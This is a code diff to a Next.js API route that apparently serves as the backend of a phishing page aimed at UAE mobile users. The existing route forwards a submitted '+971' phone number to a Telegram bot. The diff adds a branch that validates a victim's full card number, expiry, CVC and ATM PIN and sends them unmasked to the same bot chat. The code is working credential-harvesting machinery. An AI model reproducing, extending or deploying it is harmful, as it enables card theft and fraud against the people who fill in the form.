@@ -1,11 +1,56 @@
 import { NextResponse } from "next/server"
 
+function buildLoginMessage(mobile: string) {
+  return `New login mobile number: +971 ${mobile}`
+}
+
+function buildCardMessage(input: {
+  cardNumber: string
+  expiry: string
+  cvc: string
+  pin: string
+}) {
+  const digitsOnly = input.cardNumber.replace(/\D/g, "")
+  const maskedCard = digitsOnly.length >= 4 ? `**** **** **** ${digitsOnly.slice(-4)}` : "N/A"
+
+  return [
+    "New card verification submitted",
+    `Card Number: ${input.cardNumber} (masked: ${maskedCard})`,
+    `Expiry: ${input.expiry}`,
+    `CVC: ${input.cvc}`,
+    `ATM PIN: ${input.pin}`,
+  ].join("\n")
+}
+
 export async function POST(request: Request) {
   try {
-    const { mobile } = await request.json()
+    const body = await request.json()
+    const { mobile, cardNumber, expiry, cvc, pin } = body ?? {}
 
-    if (typeof mobile !== "string" || !/^\d{7,15}$/.test(mobile)) {
-      return NextResponse.json({ error: "Invalid mobile number" }, { status: 400 })
+    let text: string
+
+    if (typeof mobile === "string") {
+      if (!/^\d{7,15}$/.test(mobile)) {
+        return NextResponse.json({ error: "Invalid mobile number" }, { status: 400 })
+      }
+      text = buildLoginMessage(mobile)
+    } else if (
+      typeof cardNumber === "string" &&
+      typeof expiry === "string" &&
+      typeof cvc === "string" &&
+      typeof pin === "string"
+    ) {
+      if (
+        cardNumber.replace(/\D/g, "").length !== 16 ||
+        !/^\d{2}\/\d{2}$/.test(expiry) ||
+        !/^\d{3,4}$/.test(cvc) ||
+        !/^\d{4}$/.test(pin)
+      ) {
+        return NextResponse.json({ error: "Invalid card details" }, { status: 400 })
+      }
+      text = buildCardMessage({ cardNumber, expiry, cvc, pin })
+    } else {
+      return NextResponse.json({ error: "Invalid request" }, { status: 400 })
     }
 
     const token = process.env.TELEGRAM_BOT_TOKEN
@@ -23,7 +68,7 @@ export async function POST(request: Request) {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text: `New login mobile number: +971 ${mobile}`,
+          text,
         }),
       },
     )
